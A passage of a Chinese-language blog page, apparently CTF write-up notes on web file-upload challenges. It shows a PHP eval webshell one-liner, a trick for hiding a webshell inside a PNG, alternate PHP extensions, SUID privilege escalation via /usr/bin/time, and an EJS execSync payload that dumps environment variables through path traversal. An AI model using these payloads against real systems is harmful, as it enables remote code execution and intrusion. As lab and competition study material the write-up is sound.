&#123;</span><br><span class="line">        <span class="keyword">var</span> whitelist=<span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&quot;.jpg&quot;</span>,<span class="string">&quot;.png&quot;</span>,<span class="string">&quot;.gif&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> file_suffix=file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span>(whitelist.<span class="title function_">indexOf</span>(file_suffix) == -<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;该文件不允许上传&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></details>
+
+<p>只要<mark class="tag-plugin colorful mark" color="yellow">jpg</mark>或<mark class="tag-plugin colorful mark" color="yellow">png</mark>或<mark class="tag-plugin colorful mark" color="yellow">gif</mark></p>
+<p>法一：在浏览器关闭js，直接上传即可<br>法二：在BurpSuite拦截然后改名就可以</p>
+<h6 id="CTFHub-文件上传-文件头检查"><a href="#CTFHub-文件上传-文件头检查" class="headerlink" title="CTFHub 文件上传 文件头检查"></a>CTFHub 文件上传 文件头检查</h6><details class="tag-plugin colorful folding" ><summary><span>什么是文件头？</span></summary><div class="body"><p>文件头：程序在识别文件类型时，通常会首先查看文件魔术头。当一个程序收到一个未知文件时，它会读取文件开头的几个字节（即魔术头），然后将这些字节序列与已知的各种文件类型的魔术头数据库进行比对。如果找到匹配的魔术头，程序就可以初步确定文件的类型。例如，对于JPEG图片，其魔术头一般是“FF D8 FF”，当程序读取到文件开头是这三个字节时，就很可能判断该文件是JPEG图片。</p></div></details>
+
+<p>所以单纯的改名已经绕不过了，要把一个木马写入到一张图片里面</p>
+<p>准备一张图片，hack.txt里面有php木马，然后<mark class="tag-plugin colorful mark" color="yellow">copy 1.png/b+1.txt/a 2.png</mark><br>上传2.png然后改名2.php即可</p>
+<p>再看一道题目：</p>
+<h6 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h6><p>文件后缀名不能是php，检查了文件头，过滤了<mark class="tag-plugin colorful mark" color="yellow"><?</mark><br>对于php<br>在PHP中，可以使用的文件后缀名不仅仅限于 .php，以下是一些常见的 PHP 文件后缀名：</p>
+<details class="tag-plugin colorful folding"  open><summary><span>常见的 PHP 文件后缀名</span></summary><div class="body"><p><mark class="tag-plugin colorful mark" color="yellow">.php2, .php3, .php4, .php5, .php7, .php8</mark><br>这些后缀通常用于指定不同版本的 PHP 文件，但在现代开发中很少使用<br><mark class="tag-plugin colorful mark" color="yellow">.phtml</mark><br>通常用于包含 PHP 和 HTML 混合代码的文件<br><mark class="tag-plugin colorful mark" color="yellow">.phps</mark><br>用于展示 PHP 源代码的文件（通常是高亮显示的源代码）<br><mark class="tag-plugin colorful mark" color="yellow">.inc</mark><br>通常用于包含文件（include 或 require），但需要特别注意安全性，因为这些文件可能被直接访问<br><mark class="tag-plugin colorful mark" color="yellow">.module, .tpl, .theme</mark><br>在某些框架或 CMS（如 Drupal、WordPress 等）中，可能会使用这些后缀来表示模块、模板或主题文件<br><mark class="tag-plugin colorful mark" color="yellow">.cgi</mark><br>有时 PHP 脚本会被配置为 CGI 脚本并使用 .cgi 后缀</p></div></details>
+
+<p>这里尝试php2不行，所以用了phtml<br>一句话木马不能用了，让AI做出修改，代码如下</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="built_in">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>这样就可以了</p>
+<p>再看一题：</p>
+<h6 id="SZU靶场-Web-每日一题-2024-day-3-rce-and-escalation"><a href="#SZU靶场-Web-每日一题-2024-day-3-rce-and-escalation" class="headerlink" title="SZU靶场 Web 每日一题 2024[day 3] rce and escalation"></a>SZU靶场 Web 每日一题 2024[day 3] rce and escalation</h6><p>在r.php中已经预先准备好了一个webshell，访问题目url&#x2F;r.php即可，但是flag被设置为仅有root权限可读，需要用SUID提权才能读</p>
+<details class="tag-plugin colorful folding" child="codeblock"><summary><span>SUID是什么</span></summary><div class="body"><p>suid：在linux中的作用是能够让普通用户临时拥有该文件属主的执行权限<br>一般来说suid权限提权即可提权至最高root权限</p></div></details>
+
+<mark class="tag-plugin colorful mark" color="yellow">步骤：</mark>
+<p>先找到具有suid权限的文件</p>
+<mark class="tag-plugin colorful mark" color="yellow">find / -perm -u=s -type f 2>/dev/null</mark>
+<details class="tag-plugin colorful folding" child="codeblock"><summary><span>命令解释</span></summary><div class="body"><p>&#x2F; 表示从文件系统的顶部（根）开始，查找每个目录<br>-perm 表示搜索后面的权限<br>-type 表示我们正在寻找的文件类型<br>f 表示普通文件，而不是目录或特殊文件<br>2 表示到进程的第二个文件描述符，即 stderr（标准错误）</p><blockquote><p>表示重定向<br>&#x2F;dev&#x2F;null 是一个特殊的文件系统对象，它会丢弃写入其中的所有内容。<br>合起来的意思就是寻找具有suid标志且属主为root的文件并将所有搜索到的错误信息输出到&#x2F;dev&#x2F;null(不输出错误信息)</p></blockquote></div></details>
+
+<p>根据得到的命令去查表</p>
+<div class="tag-plugin link dis-select"><a class="link-card plain" title="" href="https://gtfobins.github.io/" target="_blank" rel="external nofollow noopener noreferrer" cardlink autofill="title"><div class="left"><span class="title">https://gtfobins.github.io/</span><span class="cap link footnote">https://gtfobins.github.io/</span></div><div class="right"><div class="lazy img" data-bg="https://github.githubassets.com/favicons/favicon.svg"></div></div></a></div>
+
+<p>对于本题：</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://songhappypicture.oss-cn-shenzhen.aliyuncs.com/img/20250412135831380.png" data-fancybox="true" style="width:100%;"/></div></div>
+<p>逐一尝试，发现time可以</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://songhappypicture.oss-cn-shenzhen.aliyuncs.com/img/20250412135931518.png" data-fancybox="true" style="width:100%;"/></div></div>
+<mark class="tag-plugin colorful mark" color="yellow">/usr/bin/time cat /fl*</mark>就可以了
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://songhappypicture.oss-cn-shenzhen.aliyuncs.com/img/20250412140301232.png" data-fancybox="true" style="width:100%;"/></div></div>
+
+<h5 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h5><h6 id="Hgame-Level-47-BandBomb"><a href="#Hgame-Level-47-BandBomb" class="headerlink" title="[Hgame]Level 47 BandBomb"></a>[Hgame]Level 47 BandBomb</h6><p>给了源码，存在一个路径遍历漏洞，可以通过重命名改变文件路径</p>
+<p>这个题使用了一个 ejs 视图引擎读取 uploads 目录中的文件列表，如果读取成功，渲染 mortis视图并传递文件列表</p>
+<details class="tag-plugin colorful folding" child="codeblock"><summary><span>什么是ejs</span></summary><div class="body"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ejs :EJS 是一种在 Node.js 环境中广泛使用的模板引擎。它允许开发者在普通的 HTML文件中嵌入 JavaScript 代码，从而实现动态生成 HTML 内容。通过 EJS，开发者可以将数据从服务器端传递到前端视图，并根据这些数据来定制 HTML 页面的展示。</span><br><span class="line">思路就是上传一个含有恶意代码的 ejs 然后通过上述路径遍历漏洞改变文件的路径让他替换 mortis.ejs</span><br></pre></td></tr></table></figure></div></details>
+
+<p>上传<mark class="tag-plugin colorful mark" color="yellow"><%= require(child_process).execSync(env > /app/public/1.txt) %></mark></p>
+<p>意思就是创建一个子进程获取环境变量把它写入到&#x2F;public 下的 1.txt<br>这时候只需要改个名从而改变它的路径替换 mortis.ejs源码中有一句话 app.use(express.json());所以改名需要 POST json</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://songhappypicture.oss-cn-shenzhen.aliyuncs.com/img/20250412141407784.png" data-fancybox="true" style="width:90%;"/></div></div>
+<p>根据前面的恶意代码，我们只需要访问&#x2F;static&#x2F;1.txt 即可获取环境变量，里面有一个FLAG</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://songhappypicture.oss-cn-shenzhen.aliyuncs.com/img/20250412141425416.png" data-fancybox="true" style="width:100%;"/></div></div>
+
+<h5 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h5><p>遇到过一道题，但是尚未解决</p>
+<h6 id="SZU靶场python-include"><a href="#SZU靶场python-include" class="headerlink" title="SZU靶场python-include"></a>SZU靶场python-include</h6><h4 id="SQL注入（SQL是一点不会-）"><a href="#SQL注入（SQL是一点不会-）" class="headerlink" title="SQL注入（SQL是一点不会 :(  ）"></a>SQL注入（SQL是一点不会 :(  ）</h4>
 <div class="article-footer fs14">
     <section id="license">
       <div class="header"><span>License</span></div>
@@ -143,7 +211,7 @@ include($page);
 
 
 
-<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">On This Page</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E"><span class="toc-text">基础漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Upload"><span class="toc-text">Upload</span></a></li></ol></div><div class="widget-footer">
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">On This Page</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#HCTF-2018-WarmUp"><span class="toc-text">[HCTF 2018]WarmUp</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Aurora%E6%96%B0%E7%94%9F%E8%B5%9B-Just-Signin"><span class="toc-text">[Aurora新生赛] Just Signin</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include1"><span class="toc-text">[ACTF2020 新生赛]Include1</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web-php-include"><span class="toc-text">[攻防世界]Web_php_include</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Upload"><span class="toc-text">Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#PHP"><span class="toc-text">PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#CTFHub-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81"><span class="toc-text">CTFHub 文件上传 前端验证</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#CTFHub-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%9F%A5"><span class="toc-text">CTFHub 文件上传 文件头检查</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload"><span class="toc-text">[极客大挑战 2019]Upload</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#SZU%E9%9D%B6%E5%9C%BA-Web-%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-2024-day-3-rce-and-escalation"><span class="toc-text">SZU靶场 Web 每日一题 2024[day 3] rce and escalation</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Node-js"><span class="toc-text">Node.js</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Hgame-Level-47-BandBomb"><span class="toc-text">[Hgame]Level 47 BandBomb</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Python"><span class="toc-text">Python</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#SZU%E9%9D%B6%E5%9C%BApython-include"><span class="toc-text">SZU靶场python-include</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%EF%BC%88SQL%E6%98%AF%E4%B8%80%E7%82%B9%E4%B8%8D%E4%BC%9A-%EF%BC%89"><span class="toc-text">SQL注入（SQL是一点不会 :(  ）</span></a></li></ol></div><div class="widget-footer">
 
 <a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>Scroll to Top</span></a></div></widget>
 </div></aside><div class='float-panel blur'>
